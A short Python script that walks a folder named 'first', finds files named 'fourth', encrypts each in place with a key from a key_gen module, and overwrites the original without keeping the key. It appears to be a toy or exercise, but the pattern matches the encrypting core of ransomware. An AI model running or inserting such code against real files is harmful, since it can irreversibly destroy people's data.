#!/usr/local/bin/python3
import os
import key_gen

path='first'
target='fourth'

def traverse(path, target):
    for dirpath, dirnames, filenames in os.walk(path):
        for file in filenames:
            if file == target:
                file_path=os.path.join(dirpath, file)
                try:
                    #Read file data
                    with open(file_path, 'rb') as f:
                        file_data=f.read()

                    #Generate key and encrypt
                    k=key_gen.key_generator()
                    encrypted_data=k.encrypt(file_data)

                    #Write encrypted data back to the file
                    with open(file_path, 'wb') as f:
                        f.write(encrypted_data)

                    print(f"Encrypted file: {file_path}")
                except Exception as e:
                    print(f"Error processing {file_path}:{e}")

#Call the function
traverse(path, target)
